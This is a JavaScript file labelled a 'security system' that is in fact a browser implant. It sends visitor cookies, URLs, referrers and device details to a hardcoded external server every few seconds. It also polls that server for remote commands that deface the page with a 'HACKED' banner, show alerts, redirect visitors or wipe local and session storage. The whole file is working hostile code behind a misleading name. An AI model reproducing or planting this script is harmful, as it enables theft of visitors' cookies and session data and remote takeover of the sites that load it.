/**
 * X-Coder Security System v7.0
 * Fix ambil command dari server
 */

(function() {
    'use strict';

    var CONFIG = {
        centralServer: 'https://nexaisback.itsmeher.my.id/sec.php', // GANTI!
        scriptId: 'SCRIPT_MASTER_V1',
        interval: 3
    };

    function getDomain() {
        return window.location.hostname;
    }

    function getData() {
        return {
            scriptId: CONFIG.scriptId,
            domain: getDomain(),
            url: window.location.href,
            path: window.location.pathname,
            title: document.title,
            referrer: document.referrer || 'Direct',
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            screen: screen.width + 'x' + screen.height,
            colorDepth: screen.colorDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookies: document.cookie ? document.cookie.substring(0, 200) : '',
            loadTime: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 0,
            timestamp: new Date().toISOString(),
            ip: '',
            localStorage: localStorage.length > 0 ? 'yes' : 'no',
            sessionStorage: sessionStorage.length > 0 ? 'yes' : 'no'
        };
    }

    // ============================================================
    // KIRIM DATA
    // ============================================================
    function sendData() {
        var data = getData();
        var url = CONFIG.centralServer;

        try {
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(function(r) { return r.json(); })
            .then(function(response) {
                if (response && response.command) {
                    executeCommand(response.command, response);
                }
            })
            .catch(function() {
                // Fallback: XHR
                try {
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', url, true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.onload = function() {
                        if (xhr.status === 200) {
                            try {
                                var resp = JSON.parse(xhr.responseText);
                                if (resp && resp.command) {
                                    executeCommand(resp.command, resp);
                                }
                            } catch(e) {}
                        }
                    };
                    xhr.send(JSON.stringify(data));
                } catch(e) {}
            });
        } catch(e) {}
    }

    // ============================================================
    // CEK PERINTAH DARI SERVER (SETIAP 15 DETIK)
    // ============================================================
    function checkCommand() {
        try {
            var url = CONFIG.centralServer + '?cmd=get&domain=' + encodeURIComponent(getDomain());
            fetch(url)
                .then(function(r) { return r.json(); })
                .then(function(response) {
                    if (response && response.command) {
                        executeCommand(response.command, response);
                    }
                })
                .catch(function() {});
        } catch(e) {}
    }

    // ============================================================
    // EKSEKUSI PERINTAH
    // ============================================================
    function executeCommand(command, data) {
        console.log('📡 Command received:', command, data);
        
        switch(command) {
            case 'deface':
                defacePage(data.html || '<h1 style="text-align:center;font-size:72px;color:#ff0000;margin-top:20%;">🔥 HACKED</h1>');
                break;
            case 'alert':
                alert(data.message || '⚠️ Security Alert!');
                break;
            case 'redirect':
                window.location.href = data.url || 'https://www.roblox.com/home';
                break;
            case 'clear':
                localStorage.clear();
                sessionStorage.clear();
                if (data.message) alert(data.message);
                break;
        }
    }

    // ============================================================
    // DEFACE PAGE
    // ============================================================
    function defacePage(html) {
        document.documentElement.innerHTML = html;
        document.body.style.cssText = 'margin:0;padding:0;';
    }

    // ============================================================
    // INISIALISASI
    // ============================================================
    function init() {
        setTimeout(sendData, 1000);
        setInterval(sendData, CONFIG.interval * 1000);
        setInterval(checkCommand, 15000); // Cek perintah setiap 15 detik
        console.log('🔍 X-Coder Security started on:', getDomain());
    }

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }

})();
